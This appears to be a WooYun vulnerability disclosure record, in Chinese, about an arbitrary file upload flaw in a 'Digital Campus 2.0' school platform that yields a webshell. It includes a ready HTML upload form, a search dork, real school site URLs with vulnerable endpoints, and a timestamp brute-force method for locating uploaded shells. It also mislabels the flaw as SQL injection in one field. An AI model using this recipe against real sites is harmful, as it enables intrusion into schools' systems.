{"id": 43116, "wybug_id": "wooyun-2014-083790", "wybug_title": "某通用型数字校园平台任意文件上传GETSHELL", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "sex is not show", "wybug_date": "2014-11-21 17:44", "wybug_open_date": "2015-02-19 17:46", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-19：\t细节向公众公开  简要描述： RT 详细说明：  程序名称：数字校园平台--Digital Campus2.0 Platform 漏洞类型：SQL注入漏洞 漏洞文件： 1. /Code/Common/SysCommonAttach.aspx?Method=UpdateFile  任意文件上传（带回显）2. /Code/Resources/VideoFile/VideoManager.aspx?Method=UploadVideo任意文件上传（不带回显）关键词：intitle:数字校园平台--Digital Campus2.0 Platform 影响用户： \n\n收集几个案例： \nhttp://www.yzhtxx.com/Code/Common/SysCommonAttach.aspx?Method=UpdateFilehttp://www.yzzqzx.com/Code/Common/SysCommonAttach.aspx?Method=UpdateFilehttp://www.yjqedu.net/Code/Common/SysCommonAttach.aspx?Method=UpdateFilehttp://www.1s1w.cn/Code/Common/SysCommonAttach.aspx?Method=UpdateFilehttp://gxnngy.com/Code/Common/SysCommonAttach.aspx?Method=UpdateFilehttp://www.zxsdszx.com/Code/Common/SysCommonAttach.aspx?Method=UpdateFilehttp://www.yzwxzx.net/Code/Common/SysCommonAttach.aspx?Method=UpdateFile\n漏洞成因：对上传的文件后缀没有过滤，导致上传任意文件漏洞利用：本地构造表单提交，上传aspx/asp文件，直接Getshell本地表单:\n<html><head></head><form action=\"http://******.com/Code/Common/SysCommonAttach.aspx?Method=UpdateFile\" method=\"post\" enctype=\"multipart/form-data\" name=\"form1\">\t<input type=hidden name=step value=2>\t<input type=\"file\" size=\"40\"  name=\"filedata\" id=\"filedata\">\t\t<input type=\"submit\" name=\"btn_Upload_Click\" value=\"提交\">\t</form>\t\t</html>\n实例演示：###NO.1：/Code/Common/SysCommonAttach.aspx?Method=UpdateFile实例1：http://www.yzhtxx.com/Code/Common/SysCommonAttach.aspx?Method=UpdateFile\n\n\n\n实例2：http://www.1s1w.cn/Code/Common/SysCommonAttach.aspx?Method=UpdateFile\n\n实例3：http://www.zxsdszx.com/Code/Common/SysCommonAttach.aspx?Method=UpdateFile \n\n实例4：http://www.yzwxzx.net/Code/Common/SysCommonAttach.aspx?Method=UpdateFile \n\n实例5：http://www.yjqedu.net/Code/Common/SysCommonAttach.aspx?Method=UpdateFile\n\n   漏洞证明：  ####NO.2:/Code/Resources/VideoFile/VideoManager.aspx?Method=UploadVideo  注意的是，这个上传没有回显，文件名是以时间(精确到毫秒级)命名的，所以只要写个脚本或者用burp跑一下就知道shell地址了就用http://www.yzhtxx.com/Code/Resources/VideoFile/VideoManager.aspx?Method=UploadVideo演示了上传的时间为2014-11-18 22:23,所以只要暴力猜解后面的秒和毫秒值，秒就1--60，所以猜解不是难事了上传后的地址：/UpLoad/Video/20141118222354735.asp\n\n   修复方案：  过滤上传的后缀   版权声明：转载请注明来源 sex is not show@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-11-26 10:40 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}